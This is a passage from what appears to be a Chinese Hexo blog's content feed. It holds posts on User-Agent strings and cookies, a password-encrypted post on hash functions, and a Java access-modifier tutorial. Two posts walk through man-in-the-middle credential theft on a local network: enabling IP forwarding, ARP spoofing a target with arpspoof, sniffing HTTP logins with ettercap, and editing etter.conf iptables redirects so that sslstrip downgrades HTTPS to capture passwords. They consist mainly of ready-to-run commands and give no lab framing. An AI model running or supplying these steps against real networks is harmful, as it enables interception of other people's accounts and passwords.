2、根据用户使用浏览器的不同，显示不同的排版从而为用户提供更好的体验。有些网站会根据这个来调整打开网站的类型,如是手机的就打开wap，显示非手机的就打开pc常规页面。用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。 
既然知道了UA的作用，那么其实客户端也可以使用UA来做一些神奇的事。
比如：伪装 User-Agen 来回避某些侦测特定浏览器才能读取的网站。
如果使用Firefox浏览器插件User-Agen switcher，用户就可以轻松地在不同UA之间切换，把自己伪装成其他浏览器。这样就可以在PC上预览WAP或移动格式的网页，比如专门为iPhone设计的页面。</font></td></tr></table>

<p>&amp;ensp;</p>
<h4 id="二、Cookie——用户追踪之基础技术"><a href="#二、Cookie——用户追踪之基础技术" class="headerlink" title="二、Cookie——用户追踪之基础技术"></a><font color="red" >二、Cookie——用户追踪之基础技术</font></h4><h5 id="2-1-关于Cookie"><a href="#2-1-关于Cookie" class="headerlink" title="2.1 关于Cookie"></a><font color="red" face="楷体">2.1 关于Cookie</font></h5><h6 id="2-1-1-前言"><a href="#2-1-1-前言" class="headerlink" title="2.1.1 前言 "></a><font color="#008B45" face="楷体"><strong>2.1.1 前言</strong> </font></h6><p><font face="仿体">&amp;emsp;Cookie是如此的重要，以至于我们后面要讲到的回头客定向、访客频次定向、用户定向等等都需要基于此技术才可以实现，并且我们日常工作中所能见到的第三方监测工具如doubleclick、99click、秒针等也都要利用cookie技术，网站分析工具如GA、百度统计、CNZZ等也需要利用Cookie。如果没有Cookie，互联网广告市场将受到巨大打击，尤其对于目前我们谈论的精准广告而言。如果没有Cookie，网站分析也不从做起，遑论优化了。<br></font></p>
<hr>
<hr>
<h6 id="2-1-2-Cookie是什么"><a href="#2-1-2-Cookie是什么" class="headerlink" title="2.1.2 Cookie是什么 "></a><font color="#008B45" face="楷体"><strong>2.1.2 Cookie是什么</strong> </font></h6><p><font face="仿体">&amp;emsp;Cookie在英文中是小甜品的意思，但在计算机语言中，Cookie指的是当你浏览某网站时，网站存储在你电脑上的一个小文本文件，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。它记录了你的用户ID，密码、浏览过的网页、停留的时间等信息，用于用户身份的辨别。Cookie通常是以user@domain格式命名的，user是你的本地用户名，domain是所访问的网站的域名。</font></p>
<hr>
<hr>
<h6 id="2-1-3-为什么要Cookie"><a href="#2-1-3-为什么要Cookie" class="headerlink" title="2.1.3 为什么要Cookie "></a><font color="#008B45" face="楷体"><strong>2.1.3 为什么要Cookie</strong> </font></h6><p><font face="仿体">&amp;emsp;因为HTTP协议是无状态的，对于一个浏览器发出的请求，服务器无法区分是不是同一个来源，无法知道上一次用户做了什么。所以，需要额外的数据用于维护会话。 Cookie 正是这样的一段随HTTP请求一起被传递的额外数据，用于维护浏览器和服务器的会话。我们可以想象一个场景，你没有登录京东时在京东上购物，选择了3件商品放入购物车，在结算时，京东为什么还能知道这三件商品是什么？没错，是Cookie！</font></p>
<hr>
<hr>
<h6 id="2-1-4-Cookie的工作原理"><a href="#2-1-4-Cookie的工作原理" class="headerlink" title="2.1.4 Cookie的工作原理 "></a><font color="#008B45" face="楷体"><strong>2.1.4 Cookie的工作原理</strong> </font></h6><p><font face="仿体">&amp;emsp;Cookie利用网页代码中的HTTP头信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。例如：当你在浏览器地址栏中键入了Amazon的URL，浏览器会向Amazon发送一个读取网页的请求，并将结果在显示器上显示。在发送之前，该网页在你的电脑上寻找Amazon网站设置的Cookie文件，如果找到，浏览器会把Cookie文件中的数据连同前面输入的URL一同发送到Amazon服务器。服务器收到Cookie数据，就会在他的数据库中检索你的ID，你的购物记录、个人喜好等信息，并记录下新的内容，增加到数据库和Cookie文件中去。如果没有检测到Cookie或者你的Cookie信息与数据库中的信息不符合，则说明你是第一次浏览该网站，服务器的CGI程序将为你创建新的ID信息，并保存到数据库中。（此例子来源于百度百科——Cookie）</font></p>
<hr>
<hr>
<h6 id="2-1-5-关于Cookie的一些知识点"><a href="#2-1-5-关于Cookie的一些知识点" class="headerlink" title="2.1.5 关于Cookie的一些知识点 "></a><font color="#008B45" face="楷体"><strong>2.1.5 关于Cookie的一些知识点</strong> </font></h6><p><font face="仿体">&amp;emsp;1、Cookie是基于浏览器的，因此当电脑上安装多个浏览器时，服务器会生成多个Cookie。虽然是同一个人，但服务器是识别为多个用户。<br>&amp;emsp;2、Cookie是基于浏览器的，因此当同一台电脑有多个人使用时，服务器也只会生成一个Cookie。虽然是多个人，但服务器会认为是一个用户。<br>&amp;emsp;3、Cookie是无法跨设备进行设置的。比如我们在单位和家里分别使用两台电脑，即使我们使用同一种同一版本的浏览器，我们还是生成了两个Cookie，服务器会认为是两个用户。（PS：现在有些浏览器可以同步数据，比如Chrome、Friefox，可以避免这种问题）<br><font color="red">请注意：以上所说的Cooke指的全部是Http Cookie。有一种Cookie——Flash Cookie，可以解决多浏览器的问题</font></font></p>
<hr>
<hr>
<h6 id="2-1-6-关于Flash-Cookie"><a href="#2-1-6-关于Flash-Cookie" class="headerlink" title="2.1.6 关于Flash Cookie "></a><font color="#008B45" face="楷体"><strong>2.1.6 关于Flash Cookie</strong> </font></h6><p><font face="仿体">&amp;emsp;FlashCookie是由FlashPlayer控制的客户端共享存储技术，鉴于目前Flash技术的普遍性，几乎所有的网站都采用，所以具有同Http Cookie一样的作用。在技术上，通过使用JavaScript与ActionScript可以将Http Cookie和Flash Cookie进行互通。<br>Flash cookie的优势在于：<br>1、跨浏览器<br>不管用户的计算机上安装了多少个浏览器或者浏览器的不同版本，使用Flash Cookie能够使所有的浏览器共用一个Cookie。<br>2、不易删除<br>所有的浏览器均提供了清除Http Cookie的快捷方式，但Flash Cookie并没有此种方式，并且其保存位置非常隐蔽，网民难以删除。<br>3、容量更大<br>Flash Cookie可以容纳最多100千字节的数据，而一个标准的HTTP Cookie只有4千字节。</font></p>
<hr>
<hr>
<h6 id="2-1-7-Cookie的数量"><a href="#2-1-7-Cookie的数量" class="headerlink" title="2.1.7 Cookie的数量 "></a><font color="#008B45" face="楷体"><strong>2.1.7 Cookie的数量</strong> </font></h6><p><font face="仿体">&amp;emsp;1、大多数浏览器支持最大为 4096 字节的 Cookie。因此最好用 Cookie 来存储用户 ID 之类的标识符，用户的详细信息则通过用户 ID从数据库或其他数据源中读取。<br>&amp;emsp;2、浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；当存储更多 Cookie时，最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie 总数作出绝对限制，通常为 300 个。 </font></p>
<hr>
<hr>
<h6 id="2-1-8-Cookie的失效时间"><a href="#2-1-8-Cookie的失效时间" class="headerlink" title="2.1.8 Cookie的失效时间 "></a><font color="#008B45" face="楷体"><strong>2.1.8 Cookie的失效时间</strong> </font></h6><p><font face="仿体">&amp;emsp;1、浏览器的Cookie设置会决定是否保存Cookie数据。如果浏览器不允许Cookie保存，则关掉浏览器后，这些数据就消失。<br>&amp;emsp;2、如果浏览器允许保存Cookie，那么Cookie的时间由服务器的设置决定。Cookie有一个Expires（有效期）属性，这个属性决定了Cookie的保存时间，服务器可以通过设定Expires字段的数值，来改变Cookie的保存时间。如果不设置该属性，那么Cookie只在浏览网页期间有效，关闭浏览器，这些Cookie自动消失，绝大多数网站属于这种情况。通常情况下，Cookie包含Server、Expires、Name、value这几个字段，其中对服务器有用的只是Name和value字段，Expires等字段的内容仅仅是为了告诉浏览器如何处理这些Cookies。 </font></p>
<hr>
<hr>
<p>参考：<a href="https://blog.csdn.net/u012195214/article/details/78889602">《【总结】浏览器 User-Agent 大全》</a>、<a href="https://blog.csdn.net/xinyuan_java/article/details/66092335">《User-Agent详解》</a>.<br>&amp;ensp;<br>&amp;ensp;<br>&amp;ensp;<br>&amp;ensp;</p>
]]></content>
      <categories>
        <category>HTTP协议</category>
      </categories>
      <tags>
        <tag>User-Agen</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《HTTP账号密码获取》</title>
    <url>/post/HTTP-password/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap</strong><br><font face="楷体"><strong>ettercap是什么？</strong></font></p>
<blockquote>
<blockquote>
<p>我们在对WEB安全检测的时候都会用到Cain和netfuke这两款工具，功能相信用过的朋友多多少少都知道，但这两款工具是在windows下运行的。<br>而ettercap是在linux下运行的 。其实功能都是差不多的，我称呼它为嗅探工具，ARP欺骗，DNS，劫持，中间人攻击等等。总之这是一款强大的安全测试工具。</p>
</blockquote>
</blockquote>
<h4 id="一、ARP欺骗"><a href="#一、ARP欺骗" class="headerlink" title="一、ARP欺骗"></a>一、ARP欺骗</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br></pre></td></tr></table></figure>
<h4 id="二、使用ettercap获取HTTP账号和密码"><a href="#二、使用ettercap获取HTTP账号和密码" class="headerlink" title="二、使用ettercap获取HTTP账号和密码"></a>二、使用ettercap获取HTTP账号和密码</h4><p><font face="楷体">另开一个终端，输入ettercap -Tq -i eth0</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>-T:文本模式<br>q:安静模式<br>i:指定网卡<br>成功后当靶机浏览HTTP网页试用账号和密码登陆时，这个终端窗口就会显示相应的url、账号、密码。<br>💛💙❤注意：当对方的用户名是使用中文登陆的，则终端窗口账号处显示的是编码，则需要使用到url解码，将这串编码解码成中文。</p>
</blockquote>
</blockquote>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash函数和消息认证</title>
    <url>/post/Hash-Message-Authentication/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3a1f7608d08bcaceb00a084c797980d6dd33a2f9d9c011624ff3d93c29e5fc87">f2cb6dad3997b265c98f36a97452129cc092e92f124168e062928c4d9cb8fadca46648e736fc1bc951b9b43d510bf6863bad8153b565e4b7b9e9d750ec263e6169692dd465dd02789a5d5f6b40a052a6762006d5903d54247fd4f90b5c300dba82c9c8474d0c1ee774ba407ecebc89db673c1e06b5ab648edd2d6929cc982fff3f83c5ef11ea21ad8bf1f072dfbe8b3e5f78bcaec3aad3ea127593d3a85215b69998c1daf92873ab625a6ac449462442f515417da5a9f61f5c6ef7c73ca50a4fd106dd996a3a1cc8a452c3c353b8efbbf3555f229f96aa686666eef91adf6f100efc8d0d7a65d477f3519b3373ce42e5b9b38c0cd709e62e2c83cf580686a12af8275882efba152552a8ad7b77e2911ab0152741ebe4f8ae570da73c7cb7d66d1868c550a40b2408a56d860e8d1310f11c74d818cdd2e366bd0c223851bbbcf29e9797e30b60124b035b27b518ca6ea1ec5bffbc2622f18b7781a42e9fd1222ca669b462fd5f1119a1c5e2e098e4f5c3fccbabb6624c932dec0b98105b03d23888bc6cfda1bc9d9a369f77747a8811e62123005c7dd4eb8dbc1f643332b26c762ee7dba6ad3ebd29880827b117fd20412382a5a39fec8e16c83becb6d7081c71d1f892ef2d0f96cd1f6ffe9ea4c41c1bab56609f0f52e6edcab859fe7e8abb78bba93801d10dc6cc372853d6cefdf2fe5ff54b63bf7e90ac8d5515cdecf159ea2cd425f9d21058a1938e9284fcaf13088a67cf26f3b358f5576e68946f7acea84c865b68a8e4a9de6dd7cb2fdf4430a53458b62ead48e427ad173a6a0ec487c734369db3a2d7b66897adc00b477a1a4037b01f804bf99635786722784fb727ea9ffc8e15ea8e3c91278a6f3531f2d6bdaebd8977ef09aaa93fbc72b228173207abf52a5b562c34dd184caf7b5671b5d42bb9a7513ded40be277952ea8524bc18dc5a39844845199c7868a69dedb27c09bcc9dd0412538f6026569478f0c0725317ebf655af8a6e878ddd61e9c24baf4eb7275abe5b8338c9b5b42f695a9daf01d510e00b8e669b5a00570aeb8fd642e6aa7475f2bee64078fcb3c87755adcb5de6088dfb84625ea616fb48e19e7a929dc9cd2a6b15da29a0d96e4f29ff5c53feca2a9408ca5250ee6831b59ffe300a688d11eb2a37e2b67e2105e35989f3d5214a769e10d15f5127594451f86ad51cdaa5f8bb836c7cb6f280f3b6bf36d49b17fd2548ce682d0e99cc5fbd443213a8c7bb57c75b7556d8813e9f01deafed59e4bbb041114424426989f9dce49909897ec52269a830f151b7a66fa7b9d16654e5e605f4824783fea79231cd9de3dd32346754a972f34140895520bc00fe8db6dd43378a22cde1ad3eb26d535fc79d2c1d6ce111b48b83b9bfefa0edcb4b66c0c2ec90e6ccd4aaa2139ee3957aa80f66ff6906b17faebd916587b1ba9d057921e380a71598be17b2f96128945884bd74fb4c26a863844a517016e2d360ee48bbf74aa1c1791a9b049bcc0ca1aaceea51462973990886873dd7a64e7247fc268cb73ae5d87d36dd857db88d57e0b5c546a8063c525d7affdcf74e49f671e5b7cfb6aea7fa1b614d679157222aaef2536d53756a04fc55e64465d2c91fc94709dead5382b43ba4169c85d15e9eec1bc71472f5cd6765b62e149200cdbcfb376b7e1c6cf9333760e66f4a53e06b2d9a4c761ba470e47a436a8298e7d6f1bdfc571f07e0580ba1402a379ef4c3c79cc95365399537197a4e4c83f41d0de74faeab44061a177cc8eb9e68698fcf558525670ffd76a89ecf89fd7db33d453daf67019bc8b37e43a1a12114b9ddef987c3da74310ea393437491afd2b80bdc55c9f4659085898f2a369feceb21e87021c77b0e9d6c3ac9c90bf4150edef3ef1e694cefd226942f2960867e4e1d416d721560999bf18061e78b26c560a9d782d9ab06a9d324e88529691daf2e683cdbf78912e9abebd79e4ecf5b4da22a9f2e91bb497ba928a9e173697cb40e4681852ef220b44254458b601dc065906227b727819825795e5aab7672b878d7b04c47c868e800c2c2088e6dbe8dca2587693ce90efeaf1ba0dc438a4bdea79e9d5f59177f37a7056f096b11172dfb95ef5ed8beb63178a1c22c6c84d475ad16fc001da2f0548701624d6bc7352581805c78bd782c8b7c73c4afcb2f4fb64c41c068c1893078ef60fb0c55d51721a7dcd4f6a0aa136318908fd843de07b8456b91515f8eae7cecdaa98586a62916fe6a97f4e4fffb807ef2ccb93873b660bce13913bb815f90b7f328260e469b1ff75a2c399c383059759433ca03d8a6692f474c69564db44649b45dcbfc19cb49c24a7c8f2b0d6d6d374eaf4451281df62d807355a405d4fecccd0fd79bd47306b20bbef79a594e3c9c50f76beb09f741076143261978dad36cccf6725c5036c85b0a6d9086255a9622f3806098caa1d75d1a792379f85b1fe69e9143bee98d948e12bd76609847e8fced82abfccede3284e1f2f0d7e2753e6ada80e83fb41715c994325daacf122edf3b6c58bfffa053f3d055bd62b521639656d1bacaa1226afb9bec30e829a6776aaf8e449a5cd681720c3f7a5e26a8ee962f2ef724b85376a984da5ccc37a4a708027010967d30a433d588f5a7a9377e7fd037e9e74c59e516b022ae85967da95396cfc472b31ed9e18c4ea6eadb7670f60ab9d06c8230d1f2482d8fab22d7bcac21bb44560fd83db26d0fa843cd5969ff33c1e14c79b6a8c4833ce30a54512f17aea1051929c9ceeaca5f30854e507cd632279e900b71f617fee8ceb8e7bd72753f8c841d0c993d27ea149936d9937d85ee8298f605716a4dcf8fa75121234da54a547506ec0920ce659f82f48a7d4f1a32f85e900039532cac20c8bec7f3aac8921f80a1402ab139330558629a7b250d097647c3158f49bded321c9f654c8f718017809ffd120a2d518b24fea1bb93d59f94e34eb60dd2fd223cb9e51fd00a4915d62325817f34735218e5def99def25c05083ae8a7beb5a58f26617537b46662790edd6b5b24f4772729b191bbcb657593f7f8a1776b2df8feb08202c78bfe5b7ff230058057c246e028475c8796d8310f82576cddb60d732e94419a2b13e07cf16a9ea64865da35d8b7476925b1391668cac2b96ffd8cfec751940b4630f2587781f86cb6dd1b17b51b7816608d5c6f25c941d5618bf8cda0b7ef7153af842a7e0e8b7f7e3de97552284ca6688b24447190110a5d9dd8402f819f721e6069560adce316c17ece6ee2648db8236915fe1e9b5d1c2f5b5f028e92583f0d674fb53c18b91e3792ab8a32241194022a4620ad0312a326decc02139d173bb8428339a933722f189cfa46830eb45c0500f95011945991e284570caffa0b50ce46eca35691b5a2e5fd673134b62b59225cabd2fd12c3e9c4b497bb89ed53ed10880bfa907eb5015d09a525478117c6f5a7ce054f8400fa96f604443bd1160a74c448ca7227aa339b90466ded45c8b82f315c8459b7dd04b18c1240168d5d3661972e442f1fb2a1b78c6b97df8911d649ee5814933467508ee91cead8a111222926e064451374f5b99edef8e9fbfb6000748e8cd584f71d1d2e15fcadb0e6730423e0fd7e24b1f3550325684852889f10ff8a93647d9ca0d4ae1521f4f2ab9a360d97dc583300129e74ac15d0cbd3d2a4a308a38b1c2f8cb55d77b07f36769068e72167f3bce7c8219b85f53ad6cd7337d3ebd3510b6c7c189d605bc6789be846a289ecc215fcb2cc64778f64cece852efbe787765c872bca0aecd8b893d333aaf80878d70d2a846a657610db5b644fd3fcc35f1407ffe26de6432254e8c88429e542ca42ce940b262554d00dc8ce891ea8a9f5363e99ace34156050f4879e62d5cfc88112b463d592c9c3995489a002c9bfbd6c5120d81fb5398c35fa76a06d7b7a1a35e5c24b4f44f192bbce1f6b1001c0a7a660dde70496d12f9009b3acee43ff5cbde51beac279b6410a14611124622a3943d0fb128b44613303813660abfe3af1fa4cad5022db58e16083c8e3d65fdac62becd83d76ea2264d8d48bef316db6708335ef6c30564df60004c97bae7ac428c8e0f956f9abea800cbbe0bc8bf3f6380cbfdf65f1e172958ce1475af3cf67f779ec64f297c3742cdbf093cfa7c759319138c34777aa32acbcc9f335457a9cb5bc99fcda5d2e9f1834a12defe3ccac4097e853502c36766f5f801489127e1618fef5875537a968bfbef5ed6d27f2c47f5fc51ee8c2996b42cfb0148138e16c10a05e57c9b79dda3f2ac6d4c9c517a6d6a9707e857329a636b9d025d4c172f7d55c3ac08c9da3f58ddd8a93e0fce2822fd0a46101803d05c522b2d75e1edf24528f27caf592ae5ffb6f23fab3f76a2373ed94371ebd642b9f305b91efc77a521f9c5306fae6b4864c3b537cef99341d2dc1973d250ae8e8447b715f95a4c8fb40972326b9b36eb6cdd532434ff7e4f78eabdd98a7080f5d97cb45ddfea37379abcd8d57b7bfd835d8d5d43739f3cb73856c5e75288a9ea80fb1a17e46780f0055d7ead0070a3d2171b6c641b090fae0b42a7870c91a5aec4323a1528cc5a6953cf4fb804a2bc9f8ae49f8594afcc887b0dcaed9ad15c010933af46679cb3326ce906dc98a4ad89eb704ff67b42ded5cbbab4405f045278c8735060efa8321ea0947fb651c1dcd175f189c9cd335cd86445745f056db15442802056aa3547916b982b4e5b84d42e84bd2ead230b295d41f0f6e3e6dcd12636aa119273041c37feb104c43b8735ccdef585cb755a5f0ccacea2e0cd8ca7e851da5f6a0bbe741ff9298209d86c3604cba02f7204263f3edeb3132089b24dacd9e2275999f669dcb1e8e354d6d14747f2446a9a29a35883c114ec0c6bff5df60cd8b50c4b15797fa030c3e826f8f909f397950f622cc76f25d26c50f65c01dc4e9168f0dc81f591f78d83e4485e04c3d427fdfe67a408f6da2dcf40b5eb869b822f473f3d1eeffdcf9e67529b58c16a79b61b103182ee762cb145deb77c363a059619164392c81ff0839342b0a6373542cb4a990d54cc02b43d6d37f0d994564e1e38e797fc875307f101909b16e557916c5a3a524468a77913f930215c3e0e49cc37ce453520654a410a965e320b6ded70868e4241ce66662a648cb6242950ad0bb94fbfaf5f8257fefeab19064684b940b6827e277b2a8f4ba449e4557ee5864557537d934d116f7c7edef60555fc6d8616aa80446c75d712d93b782fefc51db418d0b830c77e7ddfa9097cccaf28dc25183b5cfec406d42ac6cfbb875a5d0d6d7b9730b23922b9823921499d08bd8730f7575d6595abc142760a87f89b6bc4b79879ce1c3615c57def4aa38711a6b995fbb462bad9dcd473820c98a78dfce5e3678c315e93af3462a8e419b82b51efa89ba1dd7b5f9574e2eb8ebbc88c5029bc8529fa8172730a1ff8697633b0ba55b961c7b51caf54b15d616668941d7f5629be3c4c3071f66de2fe449c127f52beb32c30ee78cb0a970fd26166baedfb978b98c65fa9e96442a71b5522bc15d40c1d64530c84dfd9a713cb</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>Hash函数</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《HTTPS账号密码获取》</title>
    <url>/post/HTTPS-password/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p>
<h4 id="一、将HTTPS转换成HTTP"><a href="#一、将HTTPS转换成HTTP" class="headerlink" title="一、将HTTPS转换成HTTP"></a>一、将HTTPS转换成HTTP</h4><table><tr><td bgcolor=#D1EEEE>在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。
1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；
1.1输入/etc/ettercap/etter.conf后找到：
# if you use iptables:
#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
这个地方
2.改为（去掉两个#）：
# if you use iptables:
redir_command_on = "iptables <font color="red">-t</font> nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables <font color="red">-t</font> nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；
4.在该终端窗口下右键选择“复制SSH渠道(S)”；
5.接着直接使用HTTP账号密码获取的方法就可以了。
</td></tr></table>

<blockquote>
<blockquote>
<p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line">i</span><br><span class="line">删除两个<span class="comment">#</span></span><br><span class="line">Esc、Shift ：、wq、回车</span><br><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>
<h4 id="二、ARP欺骗和抓包获取HTTPS账号和密码"><a href="#二、ARP欺骗和抓包获取HTTPS账号和密码" class="headerlink" title="二、ARP欺骗和抓包获取HTTPS账号和密码"></a>二、ARP欺骗和抓包获取HTTPS账号和密码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>Java类、成员变量、static访问权限(4.1-4.4)</title>
    <url>/post/Java-Access-Permissions-3/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<h4 id="一、-Java中类的定义、类访问权限"><a href="#一、-Java中类的定义、类访问权限" class="headerlink" title="一、 Java中类的定义、类访问权限"></a><font color="#FF6347" face="Comic sans MS">一、 Java中类的定义、类访问权限</font></h4><h5 id="1-1-类的定义格式："><a href="#1-1-类的定义格式：" class="headerlink" title="1.1  类的定义格式："></a><font color="#3CB371" face="Comic sans MS">1.1  类的定义格式：<font></h5><p><font color="red"><strong>[修饰符] class 类名 [extends父类名] [implements接口名列表]</strong></font><br>&amp;emsp;<br>&amp;emsp;<br><img data-src="https://i.loli.net/2018/12/24/5c1fb67d13ec7.png" alt="1"></p>
<p>&amp;emsp;</p>
<h5 id="1-2-类修饰符的访问权限："><a href="#1-2-类修饰符的访问权限：" class="headerlink" title="1.2  类修饰符的访问权限："></a><font color="#3CB371" face="Comic sans MS">1.2  类修饰符的访问权限：<font></h5><table>
<thead>
<tr>
<th>类修饰符</th>
<th>访问权限</th>
</tr>
</thead>
<tbody><tr>
<td><font color="#EE3A8C" face="Arial">缺省(默认方式)</font></td>
<td><font face="Comic sans MS" color="#EE3A8C">这种类只能被同一个包中的类访问；</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">public(公共)</td>
<td><font face="Comic sans MS" color="#EE3A8C">它修饰的类能被所有的类访问；</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">abstract(抽象)</td>
<td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被实例化，它可能包含有未实现的方法。</td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">extends(继承)</td>
<td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明新创建的类继承哪个类, 被继承的类称为此类的父类。extends后面只能跟一个父类名称, 因为Java中一个类最多能继承一个类(单继承)。</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">final(最终)</td>
<td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被继承，即不能有子类。</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">implements (实现)</td>
<td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明这个类实现了哪些接口，接口名可以有多个。</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h5 id="1-3-关于类访问权限的总结："><a href="#1-3-关于类访问权限的总结：" class="headerlink" title="1.3  关于类访问权限的总结："></a><font color="#3CB371" face="Comic sans MS">1.3  关于类访问权限的总结：<font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">1.    具有继承关系的子类可以继承父类的一些成员变量，即可以不创建对象就可以直接访问，如果是
      同一个包的子类可以继承到public、缺省和protected修饰的变量，如果是不同的包的子类就只能继承
      到public 和protected的；
2.    如果是其他类，不管是一个包还是不在一个包，都要创建该类的对象才能引用
3.    如果是main方法，不管是本类还是非本类，要访问实例变量都要创建对象，可以引申到其他所有
       的类方法中
4.    私有成员只能在本类中访问，如果在main方法中访问私有成员 必须创建对象</font></td></tr></table>

<p>&amp;ensp;<br>&amp;ensp;</p>
<h4 id="二、-成员变量访问权限"><a href="#二、-成员变量访问权限" class="headerlink" title="二、 成员变量访问权限"></a><font color="#FF6347" face="Comic sans MS">二、 成员变量访问权限</font></h4><p>&amp;ensp;<br><img data-src="https://i.loli.net/2018/12/24/5c1fbf2618e79.png" alt="2"></p>
<p>&amp;ensp;<br>&amp;emsp;</p>
<h5 id="2-1-成员变量访问权限总结为："><a href="#2-1-成员变量访问权限总结为：" class="headerlink" title="2.1  成员变量访问权限总结为："></a><font color="#3CB371" face="Comic sans MS">2.1  成员变量访问权限总结为：<font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**(1) 访问修饰符缺省**
访问修饰符缺省时，成员变量只能被同一包(package) 中的所有类访问，所以也称为包(package)变量。
(缺省访问修饰符实际是friendly修饰符，但因为friendly不是Java语言的关键字，所以friendly修饰符
不能显式说明。）
**(2) public(公共)**
public修饰的成员变量可以被程序中的任何类所访问。由于public成员变量不受限制, 这易使类的对象引起
不希望的修改，建议成员变量尽量不要使用public修饰符。
**(3) protected (受保护)**
protected修饰的成员变量可以被本包及有继承关系的类自由访问。
**(4) private (私有)**
private修饰的成员变量只能在同一个类中使用。这种方式通常是最为安全的。
</font></td></tr></table>

<p>&amp;ensp;<br>&amp;ensp;</p>
<h4 id="三、-static-静态-——静态变量访问权限"><a href="#三、-static-静态-——静态变量访问权限" class="headerlink" title="三、 static(静态)——静态变量访问权限"></a><font color="#FF6347" face="Comic sans MS">三、 static(静态)——静态变量访问权限</font></h4><table><tr><td bgcolor=#ADD8E6>(1)<font color="green">**static修饰的成员变量称为**</font><font color="#1874CD">**类变量(静态变量)**</font>；<font color="green">**不用static修饰的成员变量又叫**</font><font color="#1874CD">**对象变量(实例变量)。**</font>
(2)<font color="red">**区别：</font>**对象变量依附于具体的对象实例，它的值因具体对象实例的不同而不同，而类变量为该类的所有
对象所共享，它的值不因类的对象不同而不同。
(3)可以通过类来访问静态成员变量，也可以通过该类的对象访问静态成员变量。
&ensp;&ensp;<font color="red">**形式：类名.成员变量/对象名.成员变量**</font>
(4)<font color="red">**反过来，非staic的对象方法可以直接使用static的类变量**</font>
(5)类方法不能直接调用类中的对象方法（非static方法）。
(6)定义变量时必须当即赋值。
</td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java访问权限</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的输入输出</title>
    <url>/post/Java-IO-1/</url>
